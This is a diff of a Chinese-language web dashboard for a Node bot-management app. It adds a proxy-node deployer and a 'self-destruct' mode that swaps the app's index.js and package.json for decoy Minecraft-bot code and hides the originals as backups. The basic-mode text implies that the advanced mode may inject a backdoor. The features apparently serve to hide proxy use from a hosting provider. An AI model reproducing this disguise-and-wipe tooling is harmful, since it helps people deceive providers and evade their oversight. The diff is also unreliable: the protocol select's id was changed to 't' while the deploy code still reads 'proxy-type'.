+            <button onclick="toggleTaskbar()" id="taskbar-toggle" class="btn-action bg-gradient-to-r from-blue-600 to-purple-600 w-10 h-10 rounded-full flex items-center justify-center shadow-lg">
+                <i class="fas fa-chevron-up"></i>
+            </button>
             
-            <!-- 底部任务栏 -->
-            <div class="fixed bottom-4 right-4">
-                <button onclick="toggleTaskbar()" id="taskbar-toggle" class="btn-action bg-gradient-to-r from-blue-600 to-purple-600 w-10 h-10 rounded-full flex items-center justify-center shadow-lg">
-                    <i class="fas fa-chevron-up"></i>
-                </button>
-                
-                <div id="taskbar" class="hidden fixed bottom-16 right-4 w-64 bg-slate-900/95 backdrop-blur-sm rounded-2xl p-3 border border-slate-800 shadow-2xl">
-                    <h4 class="text-sm font-bold text-slate-300 mb-3 flex items-center justify-between">
-                        <span>运行中的任务</span>
-                        <span id="running-task-count" class="bg-blue-600 text-xs px-2 py-1 rounded-full">0</span>
-                    </h4>
-                    <div id="taskbar-items" class="space-y-2 max-h-48 overflow-y-auto">
-                        <!-- 运行中的任务将在这里显示 -->
-                    </div>
+            <div id="taskbar" class="hidden fixed bottom-16 right-4 w-64 bg-slate-900/95 backdrop-blur-sm rounded-2xl p-3 border border-slate-800 shadow-2xl">
+                <h4 class="text-sm font-bold text-slate-300 mb-3 flex items-center justify-between">
+                    <span>运行中的任务</span>
+                    <span id="running-task-count" class="bg-blue-600 text-xs px-2 py-1 rounded-full">0</span>
+                </h4>
+                <div id="taskbar-items" class="space-y-2 max-h-48 overflow-y-auto">
+                    <!-- 运行中的任务将在这里显示 -->
                 </div>
             </div>
         </div>
@@ -4073,14 +3636,14 @@ app.get('/dashboard', requireAuth, (req, res) => {
                 </div>
                 
                 <div class="flex gap-3 pt-4">
-                    <button onclick="hideNezhaModal()" class="flex-1 btn-action bg-slate-800 py-3 rounded-xl text-sm font-bold">取消</button>
+                                        <button onclick="hideNezhaModal()" class="flex-1 btn-action bg-slate-800 py-3 rounded-xl text-sm font-bold">取消</button>
                     <button onclick="stopNezha()" id="nezha-stop-btn" class="flex-1 btn-action bg-red-600 py-3 rounded-xl text-sm font-bold hidden">停止</button>
                     <button onclick="saveNezhaConfig()" class="flex-1 btn-action bg-gradient-to-r from-purple-600 to-blue-600 py-3 rounded-xl text-sm font-bold">保存并启动</button>
                 </div>
             </div>
         </div>
     </div>
-    
+
     <!-- 代理服务器模态框 -->
     <div id="proxy-modal" class="fixed inset-0 bg-black/70 flex items-center justify-center z-50 hidden">
         <div class="proxy-modal rounded-2xl p-6 w-full max-w-md border max-h-[90vh] overflow-y-auto">
@@ -4096,7 +3659,6 @@ app.get('/dashboard', requireAuth, (req, res) => {
             
             <div class="space-y-4">
                 <!-- 状态显示 -->
-                
                 <div id="proxy-status-display" class="proxy-info-box">
                     <div class="flex justify-between items-center mb-2">
                         <span class="text-sm font-bold text-slate-300">当前状态</span>
@@ -4111,12 +3673,21 @@ app.get('/dashboard', requireAuth, (req, res) => {
                 
                 <!-- 配置表单 -->
                 <div>
-                    <label class="block text-sm text-slate-400 mb-1">节点协议 *</label>
-                    <select id="proxy-type" class="w-full px-3 py-2 bg-slate-800 border border-slate-700 rounded-lg text-sm">
-                        <option value="vless">VLESS (推荐)</option>
-                        <option value="vmess">VMess</option>
-                        <option value="trojan">Trojan</option>
+                    <label class="block text-sm text-slate-400 mb-1">核心类型</label>
+                    <select id="proxy-core-type" class="w-full px-3 py-2 bg-slate-800 border border-slate-700 rounded-lg text-sm">
+                        <option value="xray">Xray (默认)</option>
+                        <option value="sinbox">Sinbox</option>
                     </select>
+                </div>
+
+                <div>
+                    <label class="block text-sm text-slate-400 mb-1">节点协议 *</label>
+                    <select id="t" class="...">
+    <option value="vless">VLESS (推荐)</option>
+    <option value="vmess">VMess</option>
+    <option value="trojan">Trojan</option>
+    <option value="shadowsocks">Shadowsocks (仅Sing-box)</option>
+</select>
                 </div>
                 
                 <div>
@@ -4130,7 +3701,7 @@ app.get('/dashboard', requireAuth, (req, res) => {
                     <ul class="text-xs text-slate-400 space-y-1">
                         <li class="flex items-start gap-1">
                             <i class="fas fa-bolt text-yellow-400 mt-0.5"></i>
-                            <span>基于 Xray 核心，性能卓越</span>
+                            <span>支持 Xray 和 Sinbox 双核心切换</span>
                         </li>
                         <li class="flex items-start gap-1">
                             <i class="fas fa-cloud text-blue-400 mt-0.5"></i>
@@ -4142,7 +3713,7 @@ app.get('/dashboard', requireAuth, (req, res) => {
                         </li>
                         <li class="flex items-start gap-1">
                             <i class="fas fa-trash text-red-400 mt-0.5"></i>
-                            <span>xray_config.json 文件将在1分钟后自动删除</span>
+                            <span>配置文件自动清理</span>
                         </li>
                     </ul>
                 </div>
@@ -4155,6 +3726,230 @@ app.get('/dashboard', requireAuth, (req, res) => {
             </div>
         </div>
     </div>
+    
+    <!-- 新增：系统功能模态框 -->
+    <div id="system-modal" class="fixed inset-0 bg-black/70 flex items-center justify-center z-50 hidden">
+        <div class="system-modal rounded-2xl p-6 w-full max-w-md border max-h-[90vh] overflow-y-auto">
+            <div class="flex justify-between items-center mb-6">
+                <h3 class="text-lg font-bold text-white flex items-center gap-2">
+                    <i class="fas fa-cogs text-gray-400"></i>
+                    系统功能
+                </h3>
+                <button onclick="hideSystemModal()" class="text-slate-400 hover:text-white">
+                    <i class="fas fa-times"></i>
+                </button>
+            </div>
+            
+            <div class="space-y-4">
+                <!-- 1. 系统重启按钮 -->
+                <div>
+                    <div class="system-option-btn" onclick="toggleSystemOption('reboot')">
+                        <div class="flex items-center gap-3">
+                            <div class="w-10 h-10 rounded-full bg-blue-500/20 flex items-center justify-center text-blue-400">
+                                <i class="fas fa-redo"></i>
+                            </div>
+                            <span class="font-bold">系统重启</span>
+                        </div>
+                        <i class="fas fa-chevron-down transition-transform duration-200" id="icon-reboot"></i>
+                    </div>
+                    
+                    <div id="system-reboot-content" class="system-option-content">
+                        <p class="text-sm text-slate-400 mb-4">设置重启倒计时或立即重启脚本进程。</p>
+                        <div class="grid grid-cols-3 gap-3 mb-4">
+                            <div>
+                                <label class="block text-xs text-slate-500 mb-1">天</label>
+                                <input type="number" id="reboot-days" value="0" min="0" class="w-full bg-slate-800 border border-slate-700 rounded px-2 py-2 text-center text-white">
+                            </div>
+                            <div>
+                                <label class="block text-xs text-slate-500 mb-1">时</label>
+                                <input type="number" id="reboot-hours" value="0" min="0" class="w-full bg-slate-800 border border-slate-700 rounded px-2 py-2 text-center text-white">
+                            </div>
+                            <div>
+                                <label class="block text-xs text-slate-500 mb-1">分</label>
+                                <input type="number" id="reboot-minutes" value="0" min="0" class="w-full bg-slate-800 border border-slate-700 rounded px-2 py-2 text-center text-white">
+                            </div>
+                        </div>
+                        <div class="flex gap-2">
+                            <button onclick="scheduleSystemReboot()" class="flex-1 bg-blue-600 hover:bg-blue-500 py-2 rounded-lg text-sm font-bold text-white">
+                                定时重启
+                            </button>
+                            <button onclick="executeImmediateReboot()" class="flex-1 bg-red-600 hover:bg-red-500 py-2 rounded-lg text-sm font-bold text-white">
+                                立即重启
+                            </button>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- 2. 自毁按钮 -->
+                <div>
+                    <div class="system-option-btn system-critical-btn" onclick="toggleSystemOption('destruct')">
+                        <div class="flex items-center gap-3">
+                            <div class="w-10 h-10 rounded-full bg-red-500/20 flex items-center justify-center text-red-500">
+                                <i class="fas fa-bomb"></i>
+                            </div>
+                            <span class="font-bold">自毁模式</span>
+                        </div>
+                        <i class="fas fa-chevron-down transition-transform duration-200" id="icon-destruct"></i>
+                    </div>
+                    
+                    <div id="system-destruct-content" class="system-option-content border-red-500/30">
+                        <div class="bg-red-900/20 border border-red-500/20 rounded-lg p-3 mb-4">
+                            <h4 class="text-red-400 font-bold text-sm mb-1"><i class="fas fa-exclamation-triangle"></i> 警告</h4>
+                            <p class="text-xs text-red-200">
+                                此操作将在 1 分钟后删除并替换文件。此操作不可逆！
+                                原文件将备份为隐藏文件。
+                            </p>
+                        </div>
+                        
+                        <div id="destruct-status" class="text-center mb-4 hidden">
+                            <div class="text-2xl font-black text-red-500 animate-pulse" id="destruct-countdown">120</div>
+                            <div class="text-xs text-slate-400">秒后执行自毁</div>
+                        </div>
+                        
+                        <!-- 高级模式开关 -->
+                        <div class="flex items-center justify-between mb-4 p-3 bg-slate-800 rounded-lg">
+                            <label class="text-sm font-medium text-slate-300">高级模式</label>
+                            <label class="relative inline-flex items-center cursor-pointer">
+                                <input type="checkbox" id="advanced-destruct-mode" class="sr-only peer" onchange="toggleAdvancedDestructOptions()">
+                                <div class="w-11 h-6 bg-slate-600 peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-blue-800 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-blue-600"></div>
+                            </label>
+                        </div>
+
+                        <!-- 基础模式选项 (默认显示) -->
+<div id="basic-destruct-options" class="mb-4">
+    <p class="text-xs text-slate-400 mb-2">基础模式：自定义 index.js (纯替换，不注入探针)</p>
+    
+    <!-- 【新增】将原本高级模式里的 index.js 输入框移到这里 -->
+    <div class="mb-4">
+        <label class="block text-sm text-slate-300 mb-2">index.js 自定义代码</label>
+        <textarea id="fake-index-js-basic" rows="8" class="bg-slate-800 border border-slate-700 rounded px-3 py-2 text-xs text-white w-full font-mono" 
+                  placeholder="在此粘贴用于 index.js 的伪装代码...">const mineflayer = require('mineflayer');
+const bot = mineflayer.createBot({
+    host: 'localhost',
+    port: 25565,
+    username: 'Player_' + Math.floor(Math.random() * 1000),
+    auth: 'offline'
+});
+bot.on('spawn', () => {
+    console.log('Bot joined game.');
+});
+bot.on('error', (err) => {
+    console.log('Bot error:', err);
+});</textarea>
+        <p class="text-xs text-slate-500 mt-1">此模式下，代码将被纯净替换，不会注入任何后门逻辑。</p>
+    </div>
+</div>
+
+                        <!-- 高级模式选项 (默认隐藏) -->
+                        <div id="advanced-destruct-options" class="hidden space-y-4 mb-4 border-t border-slate-700 pt-4">
+                            <div>
+                                <label class="block text-sm text-slate-300 mb-2">选择要备份/删除的文件</label>
+                                <div class="flex flex-wrap gap-2 mb-2">
+                                    <label class="flex items-center gap-2 bg-slate-800 px-3 py-2 rounded cursor-pointer hover:bg-slate-700">
+                                        <input type="checkbox" class="file-checkbox rounded text-blue-500" value="index.js" checked>
+                                        <span class="text-xs text-slate-300">index.js</span>
+                                    </label>
+                                    <label class="flex items-center gap-2 bg-slate-800 px-3 py-2 rounded cursor-pointer hover:bg-slate-700">
+                                        <input type="checkbox" class="file-checkbox rounded text-blue-500" value="package.json">
+                                        <span class="text-xs text-slate-300">package.json</span>
+                                    </label>
+                                    <label class="flex items-center gap-2 bg-slate-800 px-3 py-2 rounded cursor-pointer hover:bg-slate-700">
+                                        <input type="checkbox" class="file-checkbox rounded text-blue-500" value="bots_config.json">
+                                        <span class="text-xs text-slate-300">bots_config.json</span>
+                                    </label>
+                                    <label class="flex items-center gap-2 bg-slate-800 px-3 py-2 rounded cursor-pointer hover:bg-slate-700">
+                                        <input type="checkbox" class="file-checkbox rounded text-blue-500" value="task_center_config.json">
+                                        <span class="text-xs text-slate-300">task_center_config.json</span>
+                                    </label>
+                                </div>
+                                <button onclick="selectAllFiles()" class="text-xs text-blue-400 hover:underline">全选</button>
+                                <button onclick="deselectAllFiles()" class="text-xs text-slate-500 hover:underline ml-2">取消全选</button>
+                            </div>
+
+                            <div>
+                                <!-- 新增：两个独立的伪装内容框 -->
+<div class="space-y-4 mb-4 border-t border-slate-700 pt-4">
+    <div>
+        <label class="block text-sm text-slate-300 mb-2">index.js 伪装代码</label>
+        <textarea id="fake-index-js-advanced" rows="6" class="bg-slate-800 border border-slate-700 rounded px-3 py-2 text-xs text-white w-full font-mono" placeholder="在此粘贴用于 index.js 的伪装代码...">const mineflayer = require('mineflayer');
+const bot = mineflayer.createBot({
+    host: 'localhost',
+    port: 25565,
+    username: 'Player_' + Math.floor(Math.random() * 1000),
+    auth: 'offline'
+});
+bot.on('spawn', () => {
+    console.log('Bot joined game.');
+});
+bot.on('error', (err) => {
+    console.log('Bot error:', err);
+});
+</textarea>
+    </div>
+    <div>
+        <label class="block text-sm text-slate-300 mb-2">package.json 伪装内容</label>
+        <textarea id="fake-package-json" rows="6" class="bg-slate-800 border border-slate-700 rounded px-3 py-2 text-xs text-white w-full font-mono" placeholder="在此粘贴用于 package.json 的 JSON 内容...">{
+  "name": "simple-mc-bot",
+  "version": "1.0.0",
+  "description": "A simple Minecraft bot.",
+  "main": "index.js",
+  "scripts": {
+    "start": "node index.js"
+  },
+  "dependencies": {
+    "mineflayer": "^4.0.0"
+  }
+}</textarea>
+    </div>
+</div>
+                            </div>
+                        </div>
+                        
+                        <button id="btn-start-destruct" onclick="executeSelfDestruct()" class="w-full bg-red-600 hover:bg-red-500 py-2 rounded-lg text-sm font-bold text-white flex items-center justify-center gap-2">
+                            <i class="fas fa-skull-crossbones"></i>
+                            启动自毁
+                        </button>
+                        <button id="btn-cancel-destruct" onclick="cancelSelfDestruct()" class="hidden w-full bg-slate-700 hover:bg-slate-600 py-2 rounded-lg text-sm font-bold text-white mt-2">
+                            取消自毁
+                        </button>
+                    </div>
+                </div>
+
+                <!-- 3. 恢复系统 -->
+                <div>
+                    <div class="system-option-btn" onclick="toggleSystemOption('restore')">
+                        <div class="flex items-center gap-3">
+                            <div class="w-10 h-10 rounded-full bg-emerald-500/20 flex items-center justify-center text-emerald-400">
+                                <i class="fas fa-undo"></i>
+                            </div>
+                            <span class="font-bold">恢复系统</span>
+                        </div>
+                        <i class="fas fa-chevron-down transition-transform duration-200" id="icon-restore"></i>
+                    </div>
+                    
+                    <div id="system-restore-content" class="system-option-content border-emerald-500/30">
+                        <div class="bg-emerald-900/20 border border-emerald-500/20 rounded-lg p-3 mb-4">
+                            <h4 class="text-emerald-400 font-bold text-sm mb-1"><i class="fas fa-info-circle"></i> 恢复说明</h4>
+                            <p class="text-xs text-emerald-200">
+                                此操作将从备份中恢复原始文件，并自动删除备份文件。
+                                支持恢复旧的二进制备份或新的 ZIP 打包备份。
+                            </p>
+                        </div>
+
+                        <div id="restore-status" class="text-center mb-4 hidden">
+                            <div class="text-sm font-bold text-emerald-400 animate-pulse" id="restore-status-text">正在查找备份...</div>
+                        </div>
+                        
+                        <button onclick="executeSystemRestore()" class="w-full bg-emerald-600 hover:bg-emerald-500 py-2 rounded-lg text-sm font-bold text-white flex items-center justify-center gap-2">
+                            <i class="fas fa-recycle"></i>
+                            执行恢复
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
     
     <!-- 创建任务模态框（增强版） -->
     <div id="create-task-modal" class="fixed inset-0 bg-black/70 flex items-center justify-center z-50 hidden">
@@ -4178,7 +3973,6 @@ app.get('/dashboard', requireAuth, (req, res) => {
                         <option value="timed-url">定时访问URL</option>
                         <option value="pteranodon">Pteranodon 控制</option>
                         <option value="discord">Discord 消息</option>
-                        <option value="web-click">网页自定义点击 (新功能)</option>
                     </select>
                 </div>
                 
@@ -4294,6 +4088,7 @@ app.get('/dashboard', requireAuth, (req, res) => {
     async function deployProxy() {
         const type = document.getElementById('proxy-type').value;
         const uuid = document.getElementById('proxy-uuid').value;
+        const coreType = document.getElementById('proxy-core-type').value; // 获取核心类型
         
         if (!type || !uuid) {
             alert('请填写节点协议和UUID');
@@ -4304,12 +4099,12 @@ app.get('/dashboard', requireAuth, (req, res) => {
             const response = await fetch('/api/proxy/deploy', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ type, uuid })
+                body: JSON.stringify({ type, uuid, coreType })
             });
             
             const data = await response.json();
             if (data.success) {
-                alert('代理节点部署成功！xray_config.json 文件将在1分钟后自动删除');
+                alert('代理节点部署成功！');
                 loadProxyStatus();
                 hideProxyModal();
             } else {
@@ -4414,6 +4209,264 @@ app.get('/dashboard', requireAuth, (req, res) => {
                 alert('停止失败: ' + data.message);
             }
         } catch (error) {
+            alert('请求失败: ' + error.message);
+        }
+    }
+    
+    // ==================== 系统功能模态框逻辑 (修改版) ====================
+    
+    function showSystemModal() {
+        const modal = document.getElementById('system-modal');
+        modal.classList.remove('hidden');
+    }
+    
+    function hideSystemModal() {
+        const modal = document.getElementById('system-modal');
+        modal.classList.add('hidden');
+    }
+    
+    function toggleSystemOption(id) {
+        const content = document.getElementById('system-' + id + '-content');
+        const icon = document.getElementById('icon-' + id);
+        const btn = icon.parentElement;
+        
+        if (content.classList.contains('open')) {
+            content.classList.remove('open');
+            icon.classList.remove('rotate-180');
+            btn.classList.remove('active');
+        } else {
+            content.classList.add('open');
+            icon.classList.add('rotate-180');
+            btn.classList.add('active');
+        }
+    }
+
+    // 新增：切换高级自毁模式
+    function toggleAdvancedDestructOptions() {
+        const isAdvanced = document.getElementById('advanced-destruct-mode').checked;
+        const basicOptions = document.getElementById('basic-destruct-options');
+        const advancedOptions = document.getElementById('advanced-destruct-options');
+        
+        if (isAdvanced) {
+            basicOptions.classList.add('hidden');
+            advancedOptions.classList.remove('hidden');
+        } else {
+            basicOptions.classList.remove('hidden');
+            advancedOptions.classList.add('hidden');
+        }
+    }
+
+    // 新增：全选/取消全选文件
+    function selectAllFiles() {
+        const checkboxes = document.querySelectorAll('.file-checkbox');
+        checkboxes.forEach(cb => cb.checked = true);
+    }
+
+    function deselectAllFiles() {
+        const checkboxes = document.querySelectorAll('.file-checkbox');
+        checkboxes.forEach(cb => cb.checked = false);
+    }
+    
+    async function scheduleSystemReboot() {
+        const days = parseInt(document.getElementById('reboot-days').value) || 0;
+        const hours = parseInt(document.getElementById('reboot-hours').value) || 0;
+        const minutes = parseInt(document.getElementById('reboot-minutes').value) || 0;
+        
+        const totalMinutes = days * 24 * 60 + hours * 60 + minutes;
+        
+        if (totalMinutes <= 0) {
+            alert('请设置有效的时间');
+            return;
+        }
+        
+        try {
+            const response = await fetch('/api/system/reboot', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ delay: totalMinutes })
+            });
+            
+            const data = await response.json();
+            if (data.success) {
+                alert(\`系统将在 \${minutes} 分钟、\${hours} 小时、\${days} 天后重启\`);
+                hideSystemModal();
+            } else {
+                alert('设置失败: ' + data.message);
+            }
+        } catch (error) {
+            alert('请求失败: ' + error.message);
+        }
+    }
+    
+    async function executeImmediateReboot() {
+        if (!confirm('确定要立即重启系统吗？')) return;
+        
+        try {
+            const response = await fetch('/api/system/reboot', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ delay: 0 })
+            });
+            
+            const data = await response.json();
+            if (data.success) {
+                alert('系统正在重启...');
+                // 等待一下以便看到消息，然后前端刷新
+                setTimeout(() => location.reload(), 2000);
+            } else {
+                alert('重启失败: ' + data.message);
+            }
+        } catch (error) {
+            alert('请求失败: ' + error.message);
+        }
+    }
+    
+    let selfDestructTimer = null;
+    let selfDestructInterval = null;
+    
+    async function executeSelfDestruct() {
+    // 获取高级模式的配置
+    const isAdvanced = document.getElementById('advanced-destruct-mode').checked;
+    const selectedFiles = Array.from(document.querySelectorAll('.file-checkbox:checked')).map(cb => cb.value);
+    
+    // 基础模式确认
+    if (!isAdvanced && !confirm('警告：此操作不可逆！确定要在1分钟后删除 index.js 吗？')) return;
+    
+    // 高级模式校验
+    if (isAdvanced && selectedFiles.length === 0) {
+        alert('高级模式下请至少选择一个文件进行备份');
+        return;
+    }
+
+        // 初始化变量
+    let indexJsContent = "";
+    let packageJsonContent = "";
+
+    // 根据模式选择读取哪个输入框
+    if (isAdvanced) {
+        // 【高级模式】读取 ID 为 fake-index-js-advanced 的内容
+        const fakeIndexJs = document.getElementById('fake-index-js-advanced');
+        const fakePackageJson = document.getElementById('fake-package-json');
+
+        if (fakeIndexJs) indexJsContent = fakeIndexJs.value;
+        if (fakePackageJson) packageJsonContent = fakePackageJson.value;
+
+    } else {
+        // 【基础模式】读取 ID 为 fake-index-js-basic 的内容
+        const fakeIndexJs = document.getElementById('fake-index-js-basic');
+
+        if (fakeIndexJs) indexJsContent = fakeIndexJs.value;
+        // 基础模式下 packageJsonContent 保持为空
+    }
+
+    // 构造请求数据
+    const payload = {
+        isAdvanced: isAdvanced,
+        files: selectedFiles,
+        indexJsContent: indexJsContent,
+        packageJsonContent: packageJsonContent
+    };
+    
+    try {
+        const response = await fetch('/api/system/self-destruct', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+        
+        const data = await response.json();
+        if (data.success) {
+            const statusDiv = document.getElementById('destruct-status');
+            const startBtn = document.getElementById('btn-start-destruct');
+            const cancelBtn = document.getElementById('btn-cancel-destruct');
+            
+            statusDiv.classList.remove('hidden');
+            startBtn.classList.add('hidden');
+            cancelBtn.classList.remove('hidden');
+            
+            let remaining = 60; // 1分钟
+            const countdownEl = document.getElementById('destruct-countdown');
+            countdownEl.innerText = remaining;
+            
+            // 前端倒计时显示
+            selfDestructInterval = setInterval(() => {
+    remaining--;
+    
+    if (remaining > 0) {
+        countdownEl.innerText = remaining;
+    } else {
+        // 倒计时结束，执行完成逻辑
+        clearInterval(selfDestructInterval); // 停止计时器
+        countdownEl.innerText = "执行完成"; // 修改文字
+        countdownEl.classList.remove('animate-pulse'); // 移除闪烁动画
+        
+        // 可选：自动隐藏状态栏或提示用户刷新
+        // setTimeout(() => location.reload(), 2000); 
+    }
+}, 1000);
+            
+        } else {
+            alert('启动失败: ' + (data.message || '未知错误'));
+        }
+    } catch (error) {
+        console.error('自毁启动错误:', error); // 在控制台打印错误方便调试
+        alert('请求失败: ' + error.message);
+    }
+}
+    
+    async function cancelSelfDestruct() {
+        try {
+            const response = await fetch('/api/system/cancel-destruct', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' }
+            });
+            
+            const data = await response.json();
+            if (data.success) {
+                if (selfDestructInterval) clearInterval(selfDestructInterval);
+                
+                document.getElementById('destruct-status').classList.add('hidden');
+                document.getElementById('btn-start-destruct').classList.remove('hidden');
+                document.getElementById('btn-cancel-destruct').classList.add('hidden');
+                alert('自毁任务已取消');
+            } else {
+                alert('取消失败: ' + data.message);
+            }
+        } catch (error) {
+            alert('请求失败: ' + error.message);
+        }
+    }
+
+    // ==================== 恢复功能逻辑 (修改版) ====================
+    async function executeSystemRestore() {
+        if (!confirm('确定要恢复系统吗？这可能覆盖当前文件。')) return;
+
+        const statusText = document.getElementById('restore-status-text');
+        const statusDiv = document.getElementById('restore-status');
+        
+        try {
+            statusDiv.classList.remove('hidden');
+            statusText.innerText = "正在执行恢复...";
+            
+            const response = await fetch('/api/system/restore', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' }
+            });
+            
+            const data = await response.json();
+            if (data.success) {
+                statusText.innerText = "恢复成功！正在重启...";
+                setTimeout(() => {
+                    location.reload();
+                }, 2000);
+            } else {
+                statusText.innerText = "恢复失败";
+                statusText.classList.replace('text-emerald-400', 'text-red-400');
+                alert('恢复失败: ' + data.message);
+            }
+        } catch (error) {
+            statusText.innerText = "请求失败";
+            statusText.classList.replace('text-emerald-400', 'text-red-400');
             alert('请求失败: ' + error.message);
         }
     }
@@ -4561,7 +4614,7 @@ app.get('/dashboard', requireAuth, (req, res) => {
                     <p class="text-[10px] text-slate-400">\${b.targetHost}:\${b.targetPort}</p>
                 </div>
                 <div class="flex items-center gap-2">
-                    <span class="full-view-status status-text text-[10px] font-black">离线</span>
+                    <span class="full-view-status text-[10px] font-black">离线</span>
                     <button onclick="toggleRobotCard('\${b.id}', this)" class="minimize-btn" title="缩小视图">−</button>
                     <button onclick="removeBot('\${b.id}')" class="text-slate-600 text-xs hover:text-white">✕</button>
                 </div>
@@ -4571,7 +4624,7 @@ app.get('/dashboard', requireAuth, (req, res) => {
             <div id="full-view-\${b.id}" class="full-view">
                 <div class="bg-cyan-950/20 p-4 rounded-3xl mb-4 border border-cyan-500/20 shadow-inner">
                     <div class="flex justify-between items-center mb-2">
-                        <span class="text-[10px] font-bold text-cyan-400 uppercase italic">高级自动续期 (DOM扫描+网络监听)</span>
+                        <span class="text-[10px] font-bold text-cyan-400 uppercase italic">自动续期 (Axios 协议)</span>
                         <div class="flex items-center gap-2">
                             <select id="re-method-\${b.id}" class="bg-slate-800 text-[10px] rounded-xl px-2 py-1 outline-none">
                                 <option value="GET" \${method === 'GET' ? 'selected' : ''}>GET</option>
@@ -4581,7 +4634,7 @@ app.get('/dashboard', requireAuth, (req, res) => {
                             <input type="checkbox" id="re-en-\${b.id}" \${b.settings.renew.enabled?"checked":""} onchange="showRenewTip('\${b.id}', this.checked)">
                         </div>
                     </div>
-                    <input id="re-url-\${b.id}" placeholder="续期接口 URL（可自动检测）" value="\${renewUrl}" class="w-full rounded-xl px-2 py-1 text-[10px] mb-1 outline-none">
+                    <input id="re-url-\${b.id}" placeholder="续期接口 URL" value="\${renewUrl}" class="w-full rounded-xl px-2 py-1 text-[10px] mb-1 outline-none">
                     
                     <!-- Cookie相似度指示器 -->
                     <div class="mb-2">
@@ -4603,20 +4656,6 @@ app.get('/dashboard', requireAuth, (req, res) => {
                             <textarea id="re-ck-\${b.id}" placeholder="Cookie（自动抓取/手动填写）" class="w-full h-10 rounded-lg px-2 py-1 text-[10px] mb-2 outline-none">\${cookie}</textarea>
                             <textarea id="re-headers-\${b.id}" placeholder="自定义请求头（格式：key1:value1\\nkey2:value2）" class="w-full h-8 rounded-lg px-2 py-1 text-[10px] mb-1 outline-none">\${customHeaders}</textarea>
                             <textarea id="re-body-\${b.id}" placeholder="自定义请求体（JSON 格式优先，仅 POST/PUT 生效）" class="w-full h-12 rounded-lg px-2 py-1 text-[10px] mb-2 outline-none">\${requestBody}</textarea>
-                        </div>
-                    </div>
-                    <div class="mb-2">
-                        <button onclick="this.nextElementSibling.classList.toggle('hidden')" class="btn-action w-full bg-cyan-900/40 text-[9px] py-1 rounded-lg text-cyan-300 mb-1">🔍 高级抓取配置（带相似度检测）▾</button>
-                        <div class="hidden space-y-1">
-                            <input id="re-lurl-\${b.id}" placeholder="登录地址（必填，关联Cookie抓取位置）" value="\${loginUrl}" class="w-full rounded px-2 py-1 text-[10px] mb-1">
-                            <input id="re-user-\${b.id}" placeholder="登录用户名（必填）" value="\${username}" class="w-full rounded px-2 py-1 text-[10px] mb-1">
-                            <input id="re-pass-\${b.id}" type="password" placeholder="登录密码（必填）" value="\${password}" class="w-full rounded px-2 py-1 text-[10px] mb-1">
-                            <button onclick="fetchCookieWithSimilarity('\${b.id}', this)" class="btn-action w-full bg-purple-600/50 py-1 rounded text-[10px] font-bold">✨ 高级检测模式（带Cookie相似度验证）</button>
-                            <div class="text-[8px] text-slate-400 p-1 bg-slate-900/30 rounded">
-                                <span class="text-emerald-400">✓</span> 自动检测与上次成功Cookie的相似度<br>
-                                <span class="text-yellow-400">⚠</span> 低于90%会提示验证<br>
-                                <span class="text-cyan-400">ⓘ</span> 确保Cookie有效性
-                            </div>
                         </div>
                     </div>
                     <button onclick="saveRenew('\${b.id}')" class="btn-action w-full bg-cyan-600 py-1.5 rounded-xl text-[10px] font-bold">保存设置并测试</button>
@@ -4661,8 +4700,8 @@ app.get('/dashboard', requireAuth, (req, res) => {
                             \${b.username}
                         </h3>
                         <div class="flex items-center justify-center gap-2">
-                            <div class="w-2 h-2 rounded-full \${b.status==='在线'?'bg-emerald-500 animate-pulse':'bg-red-500'} simplified-status-dot"></div>
-                            <span class="simplified-view-status status-text text-xs font-bold \${b.status==='在线'?'text-emerald-400':'text-red-400'}">
+                            <div class="w-2 h-2 rounded-full \${b.status==='online'?'bg-emerald-500 animate-pulse':'bg-red-500'} simplified-status-dot"></div>
+                            <span class="simplified-view-status status-text text-xs font-bold \${b.status==='online'?'text-emerald-400':'text-red-400'}">
                                 \${b.status}
                             </span>
                         </div>
@@ -4804,7 +4843,7 @@ app.get('/dashboard', requireAuth, (req, res) => {
             }
         });
         
-        allCardsSimplified = !allSimplified;
+        allCardsSimplified = !allCardsSimplified;
         if (bulkButton) {
             bulkButton.innerHTML = allCardsSimplified ? 
                 '<span class="text-sm">📱 全部展开</span>' : 
@@ -4920,7 +4959,7 @@ app.get('/dashboard', requireAuth, (req, res) => {
             btn.classList.add('bg-slate-800');
         }
         const card = document.getElementById('card-'+id); card.dataset.lock = "true";
-        await fetch('/api/bots/'+id+'/toggle', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ type })}); 
+        await fetch('/api/bots/'+id+'/toggle', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ type }) }); 
         setTimeout(() => delete card.dataset.lock, 1200);
     }
     
@@ -4929,57 +4968,12 @@ app.get('/dashboard', requireAuth, (req, res) => {
             alert('请输入有效的时间值');
             return;
         }
-        await fetch('/api/bots/'+id+'/set-timer', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ value, unit })}); 
+        await fetch('/api/bots/'+id+'/set-timer', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ value, unit }) }); 
     }
     
     async function restartNow(id) { 
         if (!confirm('确定要立即重启该机器人吗？')) return;
         await fetch('/api/bots/'+id+'/restart-now', { method: 'POST' }); 
-    }
-    
-    async function fetchCookieWithSimilarity(id, btn) {
-        const oldText = btn.innerText;
-        btn.innerText = "⏳ 正在启动高级检测（带相似度验证）...";
-        btn.disabled = true;
-        try {
-            const res = await fetch(\`/api/bots/\${id}/fetch-cookie\`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' }
-            });
-            const data = await res.json();
-            if (data.success) {
-                const cookieInput = document.getElementById(\`re-ck-\${id}\`);
